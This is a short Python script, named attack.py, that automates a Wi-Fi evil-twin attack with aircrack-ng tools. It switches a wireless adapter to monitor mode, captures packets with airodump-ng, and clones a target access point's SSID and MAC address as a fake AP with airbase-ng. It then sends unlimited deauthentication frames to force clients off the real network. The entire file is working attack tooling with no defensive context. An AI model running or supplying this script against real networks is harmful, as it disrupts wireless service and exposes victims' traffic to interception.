import subprocess
import sys

# Runs the bash command in a shell
def executeCommand(bashCommand):
	process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
	output, error = process.communicate()

	return output

# Gets name of Ralink wireless adapter
def getWIName():
	# List wireless interfaces
	output = executeCommand("sudo airmon-ng")

	# Get name of Ralink wireless adapter only
	count = 0
	for string in output.split():
	    if "Qual" in string: #"Ralink"
	        newWAindex = count - 2
	    count += 1

	return output.split()[newWAindex]


if (len(sys.argv) != 4):
	print("Usage: python attack.py <AP-name> <AP-MAC-address> <AP-channel-#>")
	exit()

SSID = sys.argv[1]
macAddress = sys.argv[2]
channel = sys.argv[3]

executeCommand("sudo airmon-ng start " + getWIName()) # Put wireless interface in monitoring mode

newInterface = getWIName() # Get interface name of new wireless interface in monitor mode

print("Running Injection Test")
executeCommand("sudo aireplay-ng --test -e " + SSID + " -a " + macAddress + " " + newInterface)

print("Running Attack")
executeCommand("sudo airodump-ng " + newInterface + " &") # Start packet capture

# Create fake AP with same MAC Address and SSID
executeCommand("sudo airbase-ng -a " + macAddress + " --essid " + SSID + " -c " + channel + " " + newInterface + " &")
print("Fake AP started")

# Deauthentication
executeCommand("sudo aireplay-ng --deauth 0 -a " + macAddress + " " + newInterface)
